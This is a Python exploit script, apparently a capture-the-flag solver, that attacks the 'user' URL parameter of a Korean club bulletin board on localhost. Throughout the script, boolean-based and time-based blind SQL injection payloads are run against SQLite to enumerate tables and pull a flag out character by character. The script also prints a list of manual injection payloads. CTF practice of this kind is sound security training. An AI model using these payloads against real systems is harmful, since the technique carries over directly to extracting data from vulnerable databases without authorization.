#!/usr/bin/env python3
import requests
import string
import time
import sys
from urllib.parse import quote

class WHOISBlindSQLSolver:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        print(f"[*] 타겟 URL: {target_url}")
        
    def test_injection(self):
        """SQL 인젝션 취약점 테스트"""
        print("[*] URL 파라미터 SQL 인젝션 취약점 테스트 중...")
        
        # True 조건 테스트 (기존 사용자)
        response_true = self.session.get(f"{self.target_url}?user=admin")
        
        # True 조건 테스트 (SQL 인젝션)
        payload_true = "admin' AND 1=1-- "
        response_sql_true = self.session.get(f"{self.target_url}?user={quote(payload_true)}")
        
        # False 조건 테스트
        payload_false = "admin' AND 1=2-- "
        response_sql_false = self.session.get(f"{self.target_url}?user={quote(payload_false)}")
        
        # 결과 분석
        true_has_posts = "post-card" in response_sql_true.text
        false_has_posts = "post-card" in response_sql_false.text
        
        if true_has_posts and not false_has_posts:
            print("[+] Boolean-based 블라인드 SQL 인젝션 취약점 확인!")
            return True
        else:
            print("[-] Boolean-based 공격이 작동하지 않을 수 있습니다.")
            print(f"[*] True 조건 결과: {'게시글 있음' if true_has_posts else '게시글 없음'}")
            print(f"[*] False 조건 결과: {'게시글 있음' if false_has_posts else '게시글 없음'}")
            return False
    
    def extract_database_info(self):
        """데이터베이스 기본 정보 추출"""
        print("[*] 데이터베이스 정보 추출 중...")
        
        # 테이블 존재 확인
        tables_to_check = ['flags', 'members', 'posts', 'users', 'admin']
        existing_tables = []
        
        for table in tables_to_check:
            payload = f"admin' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='{table}')>0-- "
            response = self.session.get(f"{self.target_url}?user={quote(payload)}")
            
            if "post-card" in response.text:
                existing_tables.append(table)
                print(f"[+] 테이블 발견: {table}")
            
        return existing_tables
    
    def extract_flag_length(self):
        """플래그 길이 추출"""
        print("[*] 플래그 길이 추출 중...")
        
        for length in range(1, 100):
            payload = f"admin' AND LENGTH((SELECT flag_value FROM flags LIMIT 1))={length}-- "
            response = self.session.get(f"{self.target_url}?user={quote(payload)}")
            
            if "post-card" in response.text:
                print(f"[+] 플래그 길이: {length}")
                return length
                
        print("[-] 플래그 길이를 찾을 수 없습니다.")
        return 50  # 기본값
    
    def boolean_based_attack(self):
        """Boolean-based 블라인드 SQL 인젝션"""
        print("[+] Boolean-based 블라인드 SQL 인젝션 시작...")
        
        # 취약점 테스트
        if not self.test_injection():
            return None
            
        # 데이터베이스 정보 추출
        tables = self.extract_database_info()
        
        if 'flags' not in tables:
            print("[-] flags 테이블을 찾을 수 없습니다.")
            return None
            
        # 플래그 길이 추출
        flag_length = self.extract_flag_length()
        
        flag = ""
        charset = string.ascii_letters + string.digits + "{}!@#$%^&*()_+-=[]|;:,.<>?"
        
        for position in range(1, flag_length + 1):
            found_char = False
            print(f"[*] Position {position} 추출 중...")
            
            for char in charset:
                # ASCII 값을 이용한 비교
                payload = f"admin' AND ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1),{position},1))={ord(char)}-- "
                
                try:
                    response = self.session.get(f"{self.target_url}?user={quote(payload)}", timeout=10)
                    
                    if "post-card" in response.text:
                        flag += char
                        print(f"[+] Position {position}: '{char}' (현재: {flag})")
                        found_char = True
                        break
                        
                except Exception as e:
                    print(f"[!] 요청 오류: {e}")
                    continue
                    
                # 진행 상황 표시
                if ord(char) % 20 == 0:
                    print(f"    ... 테스트 중: '{char}' (ASCII {ord(char)})")
            
            if not found_char:
                print(f"[-] Position {position}에서 문자를 찾을 수 없습니다.")
                break
                
            # 플래그 완성 확인
            if flag.endswith('}'):
                print("[+] 플래그 완성!")
                break
        
        return flag
    
    def time_based_attack(self):
        """Time-based 블라인드 SQL 인젝션"""
        print("[+] Time-based 블라인드 SQL 인젝션 시작...")
        
        # 시간 지연 테스트
        print("[*] 시간 지연 기능 테스트 중...")
        payload_test = "admin' AND (SELECT CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t2) ELSE 0 END)-- "
        
        start_time = time.time()
        try:
            response = self.session.get(f"{self.target_url}?user={quote(payload_test)}", timeout=10)
            elapsed = time.time() - start_time
            print(f"[*] 테스트 지연 시간: {elapsed:.2f}초")
            
        except Exception as e:
            print(f"[!] Time-based 테스트 중 오류: {e}")
            
        flag = ""
        charset = string.ascii_letters + string.digits + "{}!@#$%^&*()_+-=[]|;:,.<>?"
        
        for position in range(1, 50):
            found_char = False
            print(f"[*] Position {position} 추출 중...")
            
            for char in charset:
                # 복잡한 쿼리를 통한 시간 지연
                payload = f"admin' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1),{position},1))={ord(char)} THEN (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4) t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t2) ELSE 0 END)-- "
                
                start_time = time.time()
                try:
                    response = self.session.get(f"{self.target_url}?user={quote(payload)}", timeout=15)
                    elapsed_time = time.time() - start_time
                    
                    # 응답 시간이 0.5초 이상이면 올바른 문자
                    if elapsed_time >= 0.5:
                        flag += char
                        print(f"[+] Position {position}: '{char}' (지연시간: {elapsed_time:.2f}초, 현재: {flag})")
                        found_char = True
                        break
                        
                except Exception as e:
                    elapsed_time = time.time() - start_time
                    if elapsed_time >= 10:  # 타임아웃으로 인한 지연
                        flag += char
                        print(f"[+] Position {position}: '{char}' (타임아웃, 현재: {flag})")
                        found_char = True
                        break
            
            if not found_char:
                print(f"[-] Position {position}에서 문자를 찾을 수 없습니다.")
                break
                
            # 플래그 완성 확인
            if flag.endswith('}'):
                break
                
        return flag
    
    def extract_all_flags(self):
        """모든 플래그 추출"""
        print("[*] 모든 플래그 추출 시도...")
        
        flags = []
        
        # 플래그 개수 확인
        for count in range(1, 5):
            payload = f"admin' AND (SELECT COUNT(*) FROM flags)={count}-- "
            response = self.session.get(f"{self.target_url}?user={quote(payload)}")
            
            if "post-card" in response.text:
                print(f"[+] 총 플래그 개수: {count}")
                
                # 각 플래그 추출
                for i in range(count):
                    flag = self.extract_specific_flag(i)
                    if flag:
                        flags.append(flag)
                break
                
        return flags
    
    def extract_specific_flag(self, index):
        """특정 인덱스의 플래그 추출"""
        print(f"[*] {index + 1}번째 플래그 추출 중...")
        
        flag = ""
        charset = string.ascii_letters + string.digits + "{}!@#$%^&*()_+-=[]|;:,.<>?"
        
        for position in range(1, 60):  # 최대 60자
            found_char = False
            
            for char in charset:
                payload = f"admin' AND ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1 OFFSET {index}),{position},1))={ord(char)}-- "
                
                try:
                    response = self.session.get(f"{self.target_url}?user={quote(payload)}", timeout=10)
                    
                    if "post-card" in response.text:
                        flag += char
                        print(f"[+] Position {position}: '{char}' (현재: {flag})")
                        found_char = True
                        break
                        
                except Exception as e:
                    continue
            
            if not found_char or flag.endswith('}'):
                break
                
        return flag

def show_manual_payloads():
    """수동 테스트용 페이로드 표시"""
    print("=== 수동 테스트용 페이로드 ===")
    print()
    
    payloads = [
        ("기본 테스트", "admin' AND 1=1-- "),
        ("False 테스트", "admin' AND 1=2-- "),
        ("테이블 존재 확인", "admin' AND (SELECT COUNT(*) FROM flags)>0-- "),
        ("플래그 길이 확인", "admin' AND LENGTH((SELECT flag_value FROM flags LIMIT 1))>30-- "),
        ("첫 번째 문자 확인", "admin' AND ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1),1,1))=67-- "),
        ("시간 지연 테스트", "admin' AND (SELECT CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t2) ELSE 0 END)-- "),
    ]
    
    for desc, payload in payloads:
        print(f"{desc}:")
        print(f"  URL: http://localhost:8080?user={payload}")
        print()

def main():
    print("=== WHOIS 게시판 블라인드 SQL 인젝션 솔버 ===")
    print()
    
    if len(sys.argv) == 2 and sys.argv[1] == "--manual":
        show_manual_payloads()
        return
        
    if len(sys.argv) != 2:
        print("사용법: python3 solver.py <target_url>")
        print("예시: python3 solver.py http://localhost:8080")
        print("수동 페이로드: python3 solver.py --manual")
        return
    
    target_url = sys.argv[1]
    solver = WHOISBlindSQLSolver(target_url)
    
    print("🎯 WHOIS 동아리 게시판 URL 파라미터 공격 시작!")
    print()
    
    # Boolean-based 공격 시도
    flag = solver.boolean_based_attack()
    
    if not flag or len(flag) < 5:
        print("\n[*] Boolean-based 공격 실패. Time-based 공격을 시도합니다...")
        flag = solver.time_based_attack()
    
    print("\n" + "="*60)
    if flag and len(flag) > 5:
        print(f"🚩 메인 플래그: {flag}")
        
        # 추가 플래그 시도
        print("\n[*] 추가 플래그 검색 중...")
        all_flags = solver.extract_all_flags()
        
        if len(all_flags) > 1:
            for i, additional_flag in enumerate(all_flags[1:], 2):
                print(f"🏆 {i}번째 플래그: {additional_flag}")
        
        print("\n✅ 공격 성공!")
    else:
        print("❌ 플래그 추출 실패")
        print("\n💡 수동으로 다음 URL들을 시도해보세요:")
        print("   http://localhost:8080?user=admin' AND (SELECT COUNT(*) FROM flags)>0-- ")
        print("   http://localhost:8080?user=admin' AND 1=1-- ")
        print("\n📖 더 많은 페이로드: python3 solver.py --manual")
    print("="*60)

if __name__ == "__main__":
    main()